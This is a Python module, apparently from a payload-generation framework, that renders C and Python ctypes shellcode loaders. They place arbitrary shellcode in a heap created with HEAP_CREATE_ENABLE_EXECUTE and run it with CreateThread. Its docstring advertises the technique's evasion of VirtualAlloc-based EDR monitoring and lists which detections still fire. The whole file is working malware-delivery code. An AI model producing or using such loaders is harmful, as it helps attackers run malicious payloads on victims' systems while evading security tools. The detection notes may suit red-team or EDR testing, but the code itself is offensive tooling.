"""Loader: win_heap_exec — HeapCreate(EXECUTE) → HeapAlloc → memcpy → CreateThread.

Tier 2. Avoids VirtualAlloc entirely for the allocation step.
HeapCreate with HEAP_CREATE_ENABLE_EXECUTE returns a heap whose pages
are automatically marked executable. Subsequent HeapAlloc from that heap
produces RWX-equivalent memory without an explicit VirtualAlloc(RWX) call.

Evasion property:
  - No direct VirtualAlloc(PAGE_EXECUTE_*) call in the import trace
  - HeapCreate is a less-monitored vector on some older sensor stacks

Still triggers on:
  - Executable heap creation (flagged by modern EDR at kernel level)
  - CreateThread from non-image-backed page
"""
from __future__ import annotations

from . import _render

_render.self_register(__name__, "win_heap_exec")

_C_TEMPLATE = """\
#include <windows.h>
#include <stdio.h>
#include <string.h>

{sc_array}

int main(void) {{
    HANDLE heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, sc_len, 0);
    if (!heap) {{
        fprintf(stderr, "[-] HeapCreate failed: %lu\\n", GetLastError());
        return 1;
    }}

    LPVOID mem = HeapAlloc(heap, 0, sc_len);
    if (!mem) {{
        fprintf(stderr, "[-] HeapAlloc failed\\n");
        HeapDestroy(heap);
        return 1;
    }}
    memcpy(mem, sc, sc_len);

    HANDLE hThread = CreateThread(NULL, 0,
                                  (LPTHREAD_START_ROUTINE)mem,
                                  NULL, 0, NULL);
    if (!hThread) {{
        fprintf(stderr, "[-] CreateThread failed: %lu\\n", GetLastError());
        HeapFree(heap, 0, mem);
        HeapDestroy(heap);
        return 1;
    }}
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    HeapFree(heap, 0, mem);
    HeapDestroy(heap);
    return 0;
}}
"""

_PY_TEMPLATE = """\
import ctypes
import sys

{sc_bytes}

kernel32 = ctypes.windll.kernel32

HEAP_CREATE_ENABLE_EXECUTE = 0x00040000

heap = kernel32.HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, len(sc), 0)
if not heap:
    sys.exit(1)

mem = kernel32.HeapAlloc(ctypes.c_void_p(heap), 0, len(sc))
if not mem:
    sys.exit(1)

buf = (ctypes.c_char * len(sc)).from_buffer_copy(sc)
kernel32.RtlMoveMemory(ctypes.c_void_p(mem), buf, len(sc))

ht = kernel32.CreateThread(None, 0, ctypes.c_void_p(mem), None, 0, None)
if not ht:
    sys.exit(1)
kernel32.WaitForSingleObject(ctypes.c_void_p(ht), 0xFFFFFFFF)
"""


def generate_c(shellcode: bytes) -> str:
    """Return a compilable C loader using HeapCreate(EXECUTE) + HeapAlloc + CreateThread."""
    return _C_TEMPLATE.format(sc_array=_render.c_array_literal(shellcode, "sc"))


def generate_python(shellcode: bytes) -> str:
    """Return a Python ctypes loader using HeapCreate(EXECUTE) + HeapAlloc + CreateThread."""
    return _PY_TEMPLATE.format(sc_bytes=_render.python_bytes_literal(shellcode, "sc"))
